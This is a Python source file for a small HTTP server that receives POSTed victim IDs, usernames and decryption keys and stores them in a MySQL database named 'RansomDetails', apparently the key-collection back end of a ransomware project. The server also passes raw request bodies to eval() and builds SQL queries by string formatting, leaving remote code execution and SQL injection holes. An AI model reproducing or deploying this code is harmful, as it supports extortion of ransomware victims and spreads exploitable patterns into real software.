from http.server import BaseHTTPRequestHandler, HTTPServer
import mysql.connector
from mysql.connector import Error

connection = None

def create_server_connection(host_name, user_name, user_password):
    connection = None
    
    try:
        connection = mysql.connector.connect(host = host_name, user = user_name, passwd = user_password)
        print("Connection Successful")
    except Error as err:
        print(f"Error: '{err}'")

    return connection

def createDatabase(connection, query):
    cursor = connection.cursor()
    try:
        cursor.execute(query)
        print("Database created.")
    except Error as err:
        print(f"Error: '{err}'")

def connectToDatabase(host, username, passwd, db):
    
    try:
        connection = mysql.connector.connect(host = host, user = username, passwd = passwd, database = db)
        print("Connected to Database {}".format(db))
    except Error as err:
        print("Error: '{}'".format(err))

    return connection

def execute(connection, query):
    cursor = connection.cursor()
    try:
        cursor.execute(query)
        connection.commit()
        print("Query executed.")
    except Error as err:
        print(f"Error: '{err}'")

def insertValues(id, user, key):
    insertValue = f"""
    INSERT INTO details VALUES ('{id}', '{user}', {key});
    """
    return insertValue

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200, "Connected Successfully")
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"hello world!")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        data = data.decode("utf-8")
        data = eval(data)
        id = data["uniqueId"]
        user = data["user"]
        key = data["key"]
        self.send_response(200)
        self.end_headers()
        execute(connection, insertValues(id, user, key))
        

if __name__ == "__main__":

    username, passwd = ("YOUR_USERNAME_HERE", "YOUR_PASSWORD_HERE")    # enter the creds


    connection = create_server_connection("localhost", username, passwd)    
    createDatabase(connection, "CREATE DATABASE RansomDetails")    
    connection = connectToDatabase("localhost", username, passwd, "RansomDetails")    

    createTable = """
    CREATE TABLE Details(
        uniqueId VARCHAR(30) PRIMARY KEY,
        username VARCHAR(30) NOT NULL,
        decryption_key INT NOT NULL
    );
    """
    execute(connection, createTable)    

    WebServer = HTTPServer(("localhost", 8000), Server)
    WebServer.serve_forever()

    # trying to push this into github